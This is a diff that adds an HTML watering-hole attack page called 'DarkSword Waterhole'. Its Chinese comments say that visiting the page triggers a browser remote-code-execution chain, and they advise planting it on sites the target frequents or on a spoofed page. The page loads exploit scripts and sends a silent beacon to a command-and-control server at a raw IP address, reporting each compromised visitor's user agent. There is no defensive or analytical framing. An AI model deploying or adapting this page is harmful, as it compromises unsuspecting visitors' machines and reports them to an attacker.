@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>DarkSword Waterhole</title>
+<!-- 水坑页：目标访问即进入 Stage1 RCE → 后续链路。
+     生产环境建议：挂到目标常访站点，或做仿冒页面（ROLE_A 场景）。 -->
+</head>
+<body>
+<noscript>需要启用 JavaScript</noscript>
+<script src="js/rce_gc.js"></script>
+<script src="js/rce_jit.js"></script>
+<script src="js/chain.js"></script>
+<script>
+// 状态回报：RCE 原语建立成功后向 C2 打点（便于确认哪些访客中招）
+(function beacon() {
+    if (typeof window === "undefined" || !window.__primitive) return;
+    try {
+        fetch("http://38.55.215.11:8642/collect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                meta: { proc: "browser-rce", ua: navigator.userAgent, ts: Date.now() },
+                stage: "stage1-ok"
+            })
+        });
+    } catch (e) { /* 静默 */ }
+})();
+</script>
+<p>Loading…</p>
+</body>
+</html>
